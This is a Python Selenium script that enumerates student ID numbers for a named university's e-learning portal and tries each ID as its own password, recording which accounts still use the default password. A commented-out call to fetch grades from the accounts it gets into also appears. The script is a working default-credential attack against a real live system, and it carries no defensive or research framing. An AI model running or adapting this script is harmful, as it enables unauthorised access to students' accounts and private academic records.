from attr import NOTHING
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import  WebDriverException
import time
import os
import glob
import json


dirs = json.load(open('dirs.json'))


def get_latest_in_dir(dir):
    """Function to get latest modified file in a given directory.

    Args:
        dir (str): Directory from where to search.

    Returns:
        str: Filename of most recently modified file (whole path).
    """
    # * means all if need specific format then *.csv
    list_of_files = glob.glob(f'{dir}*')
    latest_file = max(list_of_files, key=os.path.getctime)
    print(latest_file)
    return latest_file


def get_unchanged(candidates, browser):
    """Helper function to get student ids with unchanged passwords.

    Args:
        candidates (list[str]): Student IDs to be probed.
        browser (str): Browser to be used (only chrome and firefox supported)

    Returns:
        list[str]: Student IDs with default passwords.
    """
    unchanged = []
    for cand in candidates:
        driver = login(cand, cand, browser)

        if driver is None:
            print(f'User {cand} could not login with password {cand}.')
            with open('changed.txt', 'a') as the_file:
                the_file.write(f"{cand}\n")
        else:
            print(f'User {cand} has not changed their password.')
            unchanged.append(cand)
            with open('unchanged.txt', 'a') as the_file:
                the_file.write(f"{cand}\n")
            # get_grades(driver, cand, cand)
            driver.quit()

    return unchanged


def dir_path(string):
    """Determine if a path is a file.

    Args:
        string (str): Path of interest.

    Returns:
        path: if string is a file, NotADirectoryError(string)
    """
    if os.path.isfile(string):
        return string
    else:
        return NotADirectoryError(string)


def generate_list(
    bachelors=True, masters=False, phd=False,
    _year0=103, _year1=110,
    _dep0=212, _dep1=213,
    _sid0=00, _sid1=99
) -> list[str]:
    """Helper function to generate list of student ID numbers following NDHU's standard.

    Args:
        bachelors (bool, optional): Indicate if bachelor student should be included. Defaults to True.
        masters (bool, optional): Indicate if master students should be included. Defaults to False.
        phd (bool, optional): Indicate if phd students should be included. Defaults to False.
        _year0 (int, optional): Begin generation at this year number (inclusive). Defaults to 103.
        _year1 (int, optional): End generation at this year number (inclusive). Defaults to 110.
        _dep0 (int, optional): Begin generation for department number at this number. Defaults to 212.
        _dep1 (int, optional): End generation for department number at this number. Defaults to 213.
        _sid0 (int, optional): Begin generation for department specific student number at this value. Defaults to 0.
        _sid1 (int, optional): End generation for department specific student number at this value. Defaults to 99.

    Returns:
        _type_: list of student IDs.
    """

    degrees = []
    degrees.append('4') if bachelors else NOTHING
    degrees.append('6') if masters else NOTHING
    degrees.append('8') if phd else NOTHING

    inc = 1
    if _year0 > _year1:
        inc = -1

    print(f"Generating list with the following parameters:\n")
    print("Including " +
          ("BACHELOR " if bachelors else "") +
          ("MASTER " if masters else "") +
          ("PHD " if phd else "") +
          f"students from years {_year0} through {_year1} " +
          f"and departments {_dep0} through {_dep1} " +
          f"with final digits {_sid0} through {_sid1}.")
    candidates = []
    for degree in degrees:
        for year in range(_year0, _year1, inc):
            for dep in range(_dep0, _dep1):
                for number in range(_sid0, _sid1):
                    new_stud = degree + str(year)
                    dept = str(dep)
                    dept = f'{dept: >3}'.format('0').replace(' ', '0')
                    num = str(number)
                    num = f'{num: >2}'.format('0').replace(' ', '0')
                    new_stud += dept
                    new_stud += num
                    candidates.append(new_stud)
                    # print(new_stud)

    return candidates


def login(_username, _password, browser):
    """Login helper function for NDHU's elearning portal. 
    Returns driver if user/pass combination exists, returns None if it doesn't.

    Args:
        _username (str): username (typically a student number)
        _password (str): password (same as username by default)
        browser (str): choose either chrome or firefox

    Returns:
        selenium.webdriver: driver at NDHU elearning dashboard.
    """
    if browser == 'chrome':
        profile = webdriver.ChromeOptions()
        profile.add_argument('ignore-certificate-errors')
        profile.add_experimental_option("prefs", {
            "download.default_directory": dirs['download'],
            "download.prompt_for_download": False,
            "download.directory_upgrade": True,
            "safebrowsing.enabled": True
        })
        driver = webdriver.Chrome(chrome_options=profile)
    elif browser == 'firefox':
        profile = webdriver.FirefoxProfile()
        profile.set_preference("browser.download.folderList", 2)
        profile.set_preference("browser.download.manager.showWhenStarting", False)
        profile.set_preference("browser.download.dir", dirs['download'])
        profile.set_preference("browser.helperApps.neverAsk.saveToDisk", "attachment/csv")
        profile.set_preference("pdfjs.disabled", True)
        profile.accept_untrusted_certs = True
        driver = webdriver.Firefox(firefox_profile=profile)

    for i in range(50):
        try:
            driver.get('http://www.elearn.ndhu.edu.tw/')
            break
        except WebDriverException:
            print("Couldn't connect, sleeping 10 seconds before retrying.")
        time.sleep(10)

    username = driver.find_element_by_xpath('//*[@id="login_username"]')
    username.send_keys(_username)
    password = driver.find_element_by_xpath('//*[@id="login_password"]')
    password.send_keys(_password)

    login_button = driver.find_element_by_xpath(
        '//*[@id="login"]/div[2]/input[2]')
    login_button.click()

    WebDriverWait(driver, 600).until(EC.url_changes)

    if driver.current_url == 'http://www.elearn.ndhu.edu.tw/moodle/login/index.php':  # not logged in
        driver.quit()
        return None
    elif driver.current_url == 'http://www.elearn.ndhu.edu.tw/moodle/index.php?lang=en_utf8':  # logged in
        return driver

